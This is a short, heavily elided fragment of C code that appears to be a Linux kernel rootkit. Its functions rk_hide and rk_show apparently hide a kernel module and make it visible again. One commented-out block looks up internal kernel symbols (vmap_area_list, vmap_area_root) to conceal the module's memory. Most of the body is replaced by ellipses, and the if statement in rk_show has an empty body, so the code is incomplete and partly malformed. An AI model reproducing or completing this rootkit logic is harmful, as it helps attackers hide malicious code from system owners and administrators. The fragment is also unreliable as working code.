...
static void rk_hide(void) {
	...
	/*if(first == 1) {
		...
		_vmap_area_list = (struct list_head *) ksym_lookup_name("vmap_area_list");
		_vmap_area_root = (struct rb_root *) ksym_lookup_name ("vmap_area_root");
...
static void rk_show(void) {
	if (kobject_create_and_add(name, parent));
